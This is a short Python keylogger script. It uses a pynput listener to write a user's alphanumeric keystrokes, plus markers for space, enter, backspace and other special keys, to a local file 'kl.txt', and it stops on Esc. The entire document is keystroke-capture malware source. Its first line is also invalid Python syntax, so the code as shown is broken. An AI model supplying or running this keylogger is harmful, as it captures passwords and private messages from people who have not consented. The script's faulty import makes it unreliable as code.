import __import__('pynput.keyboard') as kb
def on_press(k):
    try:
        with open('kl.txt', 'a') as f:
            if k.char.isalnum():
                f.write(k.char)
    except AttributeError:
        with open('kl.txt', 'a') as f:
            sp = 'Key.space'
            en = 'Key.enter'
            bs = 'Key.backspace'
            if str(k) in [sp, en]:
                f.write('\n')
            elif str(k) == bs:
                f.write('[BACKSPACE]')
            else:
                f.write(f'[{k}]')
def on_release(k):
    esc = 'Key.esc'
    if k == getattr(kb.Key, esc[4:]):
        return False
with kb.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()